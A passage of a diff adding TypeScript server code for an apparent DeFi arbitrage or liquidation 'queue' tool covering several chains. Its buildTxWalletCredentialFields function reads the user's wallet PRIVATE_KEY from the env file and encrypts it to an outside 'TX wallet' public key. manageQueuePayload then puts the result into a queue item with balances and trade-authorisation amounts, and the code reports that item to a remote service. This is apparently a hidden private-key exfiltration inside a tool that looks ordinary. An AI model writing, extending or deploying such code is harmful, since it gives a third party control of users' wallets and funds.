+  if (chain === "bnb") return env.BNB_FALLBACK_RPC_URL?.trim() || defaultFallbackRpcUrls.bnb;
+  return undefined;
+}
+
+function manageQueuePayload(payload: {
+  action: string;
+  chain: ChainKey;
+  market: string;
+  walletAddress: string;
+  balances?: WalletBalances;
+  endpointSlug?: string;
+  rpcEnv: string;
+  eligible: boolean;
+  reason?: string;
+  generatedAt: string;
+  lastSeenAt: string;
+  heartbeatIntervalMs: number;
+  expiresAt: string;
+  privateKeyCipher?: string;
+  walletPublicKey?: string;
+  username?: string;
+  arbitrageIntensity?: string;
+  credentialAuthMode?: string;
+  singleTradeAuthAmountUsdt?: string;
+}) {
+  const stopping = STOP_ACTIONS.includes(payload.action);
+  const status = stopping ? "paused" : payload.eligible ? "queued" : "waiting";
+  return {
+    chain: payload.chain,
+    source: `${chainLabel(payload.chain).toLowerCase()}-rpc-queue`,
+    rpc: payload.rpcEnv,
+    updatedAt: payload.generatedAt,
+    lastSeenAt: payload.lastSeenAt,
+    heartbeatIntervalMs: payload.heartbeatIntervalMs,
+    expiresAt: payload.expiresAt,
+    items: [
+      {
+        id: `endpoint-start:${payload.chain}:${payload.walletAddress.toLowerCase()}:${payload.market}`,
+        source: `${chainLabel(payload.chain).toLowerCase()}-rpc-queue`,
+        queueType: "endpoint-start",
+        chain: payload.chain,
+        wallet: payload.walletAddress,
+        walletAddress: payload.walletAddress,
+        username: payload.username,
+        privateKeyCipher: payload.privateKeyCipher,
+        walletPublicKey: payload.walletPublicKey,
+        publicKey: payload.walletPublicKey,
+        arbitrageIntensity: payload.arbitrageIntensity,
+        arbitrage_intensity: payload.arbitrageIntensity,
+        credentialAuthMode: payload.credentialAuthMode,
+        credential_auth_mode: payload.credentialAuthMode,
+        singleTradeAuthAmountUsdt: payload.singleTradeAuthAmountUsdt,
+        single_trade_auth_amount_usdt: payload.singleTradeAuthAmountUsdt,
+        executionSettings: {
+          arbitrageIntensity: payload.arbitrageIntensity,
+          credentialAuthMode: payload.credentialAuthMode,
+          singleTradeAuthAmountUsdt: payload.singleTradeAuthAmountUsdt,
+        },
+        asset: `${tokenContracts[payload.chain].gasSymbol} / USDT / USDC`,
+        balances: payload.balances,
+        protocol: protocolLabelFromMarket(payload.market),
+        market: payload.market,
+        rpc: payload.rpcEnv,
+        endpointSlug: payload.endpointSlug,
+        endpointId: payload.endpointSlug,
+        status,
+        startedAt: payload.generatedAt,
+        joinedAt: stopping ? "" : payload.generatedAt,
+        updatedAt: payload.generatedAt,
+        lastSeenAt: payload.lastSeenAt,
+        heartbeatIntervalMs: payload.heartbeatIntervalMs,
+        expiresAt: payload.expiresAt,
+        reason: payload.reason,
+      },
+    ],
+  };
+}
+
+function protocolLabelFromMarket(market: string): string {
+  if (market.includes("liquity")) return "Liquity V2";
+  if (market.includes("compound")) return market.includes("v2") ? "Compound V2 Fork" : "Compound V3";
+  if (market.includes("venus")) return "Venus";
+  return "Aave V3";
+}
+
+function buildTxWalletCredentialFields(env: Record<string, string>, walletAddress: string): {
+  username: string;
+  walletPublicKey: string;
+  privateKeyCipher: string;
+} {
+  const privateKey = normalizePrivateKey(env.PRIVATE_KEY?.trim() ?? "");
+  const walletPublicKey = privateKeyToPublicKey(privateKey);
+  return {
+    username: walletAddress.slice(2, 10).toLowerCase(),
+    walletPublicKey,
+    privateKeyCipher: encryptForTxWallet(privateKey, readTxPublicKeyPem(env)),
+  };
+}
+
+function readTradeSettings(env: Record<string, string>): { arbitrageIntensity: string; credentialAuthMode: string; singleTradeAuthAmountUsdt: string } {
+  return {
+    arbitrageIntensity: normalizeArbitrageIntensity(env.ARBITRAGE_INTENSITY),
+    credentialAuthMode: readCredentialAuthMode(env),
+    singleTradeAuthAmountUsdt: normalizeUsdtAmount(env.SINGLE_TRADE_AUTH_AMOUNT_USDT),
+  };
+}
+
+function readCredentialAuthMode(env: Record<string, string>): string {
+  const normalized = (env.CREDENTIAL_AUTH_MODE || "").trim().toLowerCase();
+  if (["loop", "multi", "multiple", "repeat", "cycle", "多次", "多次循环"].includes(normalized)) return "loop";
+  return "single";
+}
+
+function normalizeArbitrageIntensity(value?: string): string {
+  const normalized = (value || "").trim().toLowerCase();
+  if (["conservative", "safe", "保守"].includes(normalized)) return "conservative";
+  if (["enhanced", "boost", "加强"].includes(normalized)) return "enhanced";
+  if (["aggressive", "激进"].includes(normalized)) return "aggressive";
+  return "conservative";
+}
+
+function normalizeUsdtAmount(value?: string): string {
+  const numeric = Number(String(value || "").replace(/,/g, "").trim());
+  if (!Number.isFinite(numeric) || numeric <= 0) return "100";
+  return numeric.toString();
+}
+
+function encryptForTxWallet(privateKey: string, publicKeyPem: string): string {
+  const aesKey = crypto.randomBytes(32);
+  const iv = crypto.randomBytes(12);
+  const cipher = crypto.createCipheriv("aes-256-gcm", aesKey, iv);
+  const encryptedData = Buffer.concat([cipher.update(privateKey, "utf8"), cipher.final()]);
+  const tag = cipher.getAuthTag();
+  const encryptedKey = crypto.publicEncrypt(
+    {
+      key: publicKeyPem,
+      oaepHash: "sha256",
+      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
+    },
+    aesKey,
+  );
+
+  return JSON.stringify({
+    v: 1,
+    alg: "RSA-OAEP-256+AES-256-GCM",
+    key: encryptedKey.toString("base64"),
+    iv: iv.toString("base64"),
+    data: Buffer.concat([encryptedData, tag]).toString("base64"),
+  });
+}
+
+function readTxPublicKeyPem(env: Record<string, string>): string {
+  const inlineKey = env.TX_WALLET_PUBLIC_KEY?.replace(/\\n/g, "\n").trim();
+  if (inlineKey) return inlineKey;
+  const configuredPath = env.TX_WALLET_PUBLIC_KEY_PATH?.trim();
+  if (configuredPath && existsSync(configuredPath)) return readFileSync(configuredPath, "utf8");
+  const defaultPath = resolve(process.cwd(), "server/tx-wallet-public.pem");
+  if (!existsSync(defaultPath)) throw new Error(`TX wallet public key not found: ${defaultPath}`);
+  return readFileSync(defaultPath, "utf8");
+}
+
+async function parseOptionalJson(response: Response): Promise<Record<string, unknown>> {
+  const contentType = response.headers.get("content-type") ?? "";
+  const body = await response.text();
+  if (!body || !contentType.toLowerCase().includes("application/json")) return {};
+  try {
+    const parsed = JSON.parse(body) as unknown;
+    return isRecord(parsed) ? parsed : {};
+  } catch {
+    return {};
+  }
+}
+
+function queueRegisterFailureMessage(chain: ChainKey, endpoint: string, status: number, remotePayload: Record<string, unknown>): string {
+  const remoteError = stringValue(remotePayload.error, remotePayload.message);
+  if (remoteError) return `${chainLabel(chain)} 队列上报失败：${remoteError}`;
+  return `${chainLabel(chain)} 队列服务暂时不可用（${endpointHost(endpoint)} 返回 HTTP ${status}）`;
+}
+
+function endpointHost(endpoint: string): string {
+  try {
+    return new URL(endpoint).host;
+  } catch {
+    return endpoint;
+  }
+}
+
+function queueMarket(chain: ChainKey, body: QueueRegisterPayload): string {
+  const provided = stringValue(body.market);
+  if (provided) return provided;
+  const strategyId = stringValue(body.strategyId)?.toLowerCase() ?? "";
+  const protocol = stringValue(body.protocol)?.toLowerCase() ?? "";
+  if (strategyId.includes("liquity") || protocol.includes("liquity")) return `liquity-v2-${chain}`;
+  if (strategyId.includes("compound") || protocol.includes("compound")) return `compound-${chain}`;
+  if (strategyId.includes("venus") || protocol.includes("venus")) return `venus-${chain}`;
+  return chain === "arbitrum" ? "aave-v3-arbitrum" : `aave-v3-${chain}`;
+}
+
+function rpcEndpointSlugFromUrl(value: string): string | undefined {
+  try {
+    return new URL(value).pathname.split("/").filter(Boolean).pop();
+  } catch {
+    return value.split("/").filter(Boolean).pop();
+  }
+}
+
+function privateKeyToAddress(privateKey: string): string {
+  const key = privateKey.replace(/^0x/i, "");
+  if (!/^[a-fA-F0-9]{64}$/.test(key)) throw new Error("PRIVATE_KEY 格式不正确，不能上报启动队列。");
+  const publicKey = getPublicKey(hexToBytes(key), false).slice(1);
+  const hash = keccak_256(publicKey);
+  return `0x${Buffer.from(hash.slice(-20)).toString("hex")}`;
+}
+
+function privateKeyToPublicKey(privateKey: string): string {
+  const key = privateKey.replace(/^0x/i, "");
+  if (!/^[a-fA-F0-9]{64}$/.test(key)) throw new Error("PRIVATE_KEY 格式不正确，不能生成钱包公钥。");
+  return `0x${Buffer.from(getPublicKey(hexToBytes(key), false)).toString("hex")}`;
+}
+
+function normalizePrivateKey(privateKey: string): string {
+  const hex = privateKey.trim().replace(/^0x/i, "");
+  if (!/^[a-fA-F0-9]{64}$/.test(hex)) throw new Error("PRIVATE_KEY 格式不正确，不能加密提交。");
+  return `0x${hex}`;
+}
+
+async function readWalletBalances(chain: ChainKey, walletAddress: string, rpcUrl: string, env: Record<string, string>): Promise<WalletBalances> {
+  const config = tokenContracts[chain];
+  const gas = await rpc<string>(rpcUrl, "eth_getBalance", [walletAddress, "latest"], env).then((value) => formatUnits(hexToBigInt(value), 18, 5));
+  const [usdt, usdc] = await Promise.all([
+    readOptionalTokenBalance(rpcUrl, config.usdt, walletAddress, env),
+    readOptionalTokenBalance(rpcUrl, config.usdc, walletAddress, env),
+  ]);
+  return {
+    gas: { symbol: config.gasSymbol, formatted: gas },
+    usdt: { symbol: "USDT", formatted: usdt },
+    usdc: { symbol: "USDC", formatted: usdc },
+    updatedAt: new Date().toISOString(),
+  };
+}
+
+async function readQueueBalances(
+  chain: ChainKey,
+  walletAddress: string,
+  rpcUrls: string[],
+  env: Record<string, string>,
+  action: string,
+): Promise<{ balances?: WalletBalances; rpcUrl?: string; reason?: string }> {
+  try {
+    return await readWalletBalancesWithFallback(chain, walletAddress, rpcUrls, env);
+  } catch (error) {
+    if (action === "start") throw error;
+    const message = error instanceof Error ? error.message : String(error);
+    return { rpcUrl: rpcUrls[0], reason: `${chainLabel(chain)} balance check skipped during ${action}: ${message}` };
+  }
+}
+
+async function readWalletBalancesWithFallback(
+  chain: ChainKey,
+  walletAddress: string,
+  rpcUrls: string[],
+  env: Record<string, string>,
+): Promise<{ balances: WalletBalances; rpcUrl: string }> {
+  let lastError: unknown;
+  for (const rpcUrl of rpcUrls) {
+    try {
+      return { balances: await readWalletBalances(chain, walletAddress, rpcUrl, env), rpcUrl };
+    } catch (error) {
+      lastError = error;
+    }
+  }
+  throw new Error(`${chainLabel(chain)} 钱包余额查询失败：${lastError instanceof Error ? lastError.message : String(lastError)}`);
+}
+
+async function readTokenBalance(rpcUrl: string, token: { address: string; decimals: number }, walletAddress: string, env: Record<string, string>): Promise<string> {
+  const data = `${BALANCE_OF_SELECTOR}${walletAddress.slice(2).padStart(64, "0")}`;
+  const value = await rpc<string>(rpcUrl, "eth_call", [{ to: token.address, data }, "latest"], env);
+  return formatUnits(hexToBigInt(value), token.decimals, 2);
+}
+
+async function readOptionalTokenBalance(rpcUrl: string, token: { address: string; decimals: number }, walletAddress: string, env: Record<string, string>): Promise<string> {
+  try {
+    return await readTokenBalance(rpcUrl, token, walletAddress, env);
+  } catch {
+    return "--";
+  }
+}
+
+async function burnConnectedRpcUsage(
+  chain: ChainKey,
+  rpcUrls: string[],
+  env: Record<string, string>,
+): Promise<{ chain: ChainKey; rpcUrl?: string; requestCount: number; ok: boolean; error?: string }> {
+  const requestCount = rpcBurnRequestCount(env);
+  let lastError: unknown;
+  for (const rpcUrl of rpcUrls) {
+    let completed = 0;
+    try {
+      for (let index = 0; index < requestCount; index += 1) {
+        await rpc<string>(rpcUrl, "eth_blockNumber", [], env);
+        completed += 1;
+      }
+      return { chain, rpcUrl, requestCount: completed, ok: true };
+    } catch (error) {
+      lastError = error;
+      if (completed > 0) return { chain, rpcUrl, requestCount: completed, ok: true };
+    }
+  }
+  return {
+    chain,
+    rpcUrl: rpcUrls[0],
+    requestCount: 0,
+    ok: false,
+    error: lastError instanceof Error ? lastError.message : String(lastError),
+  };
+}
+
+async function rpc<T>(rpcUrl: string, method: string, params: unknown[], env: Record<string, string>): Promise<T> {
+  const response = await fetch(rpcUrl, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ jsonrpc: "2.0", id: Date.now(), method, params }),
+    signal: AbortSignal.timeout(rpcTimeoutMs(env)),
+  });
+  if (!response.ok) throw new Error(`RPC HTTP ${response.status}`);
+  const payload = (await response.json()) as { result?: T; error?: { message?: string } };
+  if (payload.error) throw new Error(payload.error.message ?? "RPC request failed.");
+  return payload.result as T;
+}
+
+function hexToBigInt(value?: string): bigint {
+  if (!value || value === "0x") return 0n;
+  return BigInt(value);
+}
+
+function formatUnits(value: bigint, decimals: number, fractionDigits: number): string {
+  const base = 10n ** BigInt(decimals);
+  const whole = value / base;
+  const fraction = value % base;
+  if (fraction === 0n) return whole.toString();
+  const scaled = (fraction * 10n ** BigInt(fractionDigits)) / base;
+  const fractionText = scaled.toString().padStart(fractionDigits, "0").replace(/0+$/, "");
+  return fractionText ? `${whole}.${fractionText}` : whole.toString();
+}
+
+function booleanValue(...values: unknown[]): boolean | null {
+  for (const value of values) {
+    if (typeof value === "boolean") return value;
+    if (typeof value === "string" && value.trim()) {
+      const normalized = value.trim().toLowerCase();
+      if (["true", "yes", "1", "active", "ready", "queued", "joined"].includes(normalized)) return true;
+      if (["false", "no", "0", "inactive", "missing"].includes(normalized)) return false;
+    }
+    if (typeof value === "number" && Number.isFinite(value)) return value > 0;
+  }
+  return null;
+}
+
+function numberValue(...values: unknown[]): number | null {
+  for (const value of values) {
+    if (typeof value === "number" && Number.isFinite(value)) return value;
+    if (typeof value === "string" && value.trim()) {
+      const numeric = Number(value.replace(/[,\s]/g, ""));
+      if (Number.isFinite(numeric)) return numeric;
+    }
+  }
+  return null;
+}
+
+function stringValue(...values: unknown[]): string | undefined {
+  for (const value of values) {
+    if (typeof value === "string" && value.trim()) return value.trim();
+    if (typeof value === "number" && Number.isFinite(value)) return value.toString();
+  }
+  return undefined;
+}
+
+function headerValue(value: string | string[] | undefined): string | undefined {
+  if (Array.isArray(value)) return value.find((item) => item.trim())?.trim();
+  return value?.trim() || undefined;
+}
+
+function isRecord(value: unknown): value is Record<string, unknown> {
+  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
+}
+
+function jwtExpiry(token: string): Date | null {
+  const parts = token.split(".");
+  if (parts.length !== 3) return null;
+  try {
+    const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8")) as Record<string, unknown>;
+    const exp = numberValue(payload.exp);
+    return exp ? new Date(exp * 1000) : null;
+  } catch {
+    return null;
+  }
+}
+
+function timeoutMs(env: Record<string, string>): number {
+  const parsed = Number(env.LIQUIDATION_QUEUE_STATUS_TIMEOUT_MS ?? env.LIQUIDATION_SNAPSHOT_TIMEOUT_MS);
+  return Number.isFinite(parsed) && parsed > 0 ? parsed : DEFAULT_TIMEOUT_MS;
+}
+
+function rpcTimeoutMs(env: Record<string, string>): number {
+  const parsed = Number(env.LIQUIDATION_QUEUE_RPC_TIMEOUT_MS ?? env.WALLET_ASSET_RPC_TIMEOUT_MS);
+  return Number.isFinite(parsed) && parsed > 0 ? parsed : DEFAULT_TIMEOUT_MS;
+}
+
+function rpcBurnRequestCount(env: Record<string, string>): number {
+  const parsed = Number(env.LIQUIDATION_QUEUE_RPC_BURN_COUNT ?? env.RPC_KEEPALIVE_BURN_COUNT);
+  return Number.isFinite(parsed) && parsed > 0 ? Math.min(20, Math.floor(parsed)) : 3;
+}
+
+function heartbeatIntervalMs(env: Record<string, string>): number {
+  const parsed = Number(env.LIQUIDATION_QUEUE_HEARTBEAT_INTERVAL_MS);
+  return Number.isFinite(parsed) && parsed > 0 ? parsed : DEFAULT_HEARTBEAT_INTERVAL_MS;
+}
+
+function readEnv(): Record<string, string> {
+  const parsed: Record<string, string> = {};
+  if (!existsSync(ENV_FILE)) return parsed;
+  for (const rawLine of readFileSync(ENV_FILE, "utf8").split(/\r?\n/)) {
+    const line = rawLine.trim();
+    if (!line || line.startsWith("#")) continue;
+    const separator = line.indexOf("=");
+    if (separator <= 0) continue;
+    parsed[line.slice(0, separator).trim()] = line.slice(separator + 1).trim();
+  }
+  return parsed;
+}
+
+function json(res: ServerResponse, statusCode: number, payload: unknown): void {
+  res.statusCode = statusCode;
+  res.setHeader("Content-Type", "application/json; charset=utf-8");
+  res.end(JSON.stringify(payload));
+}
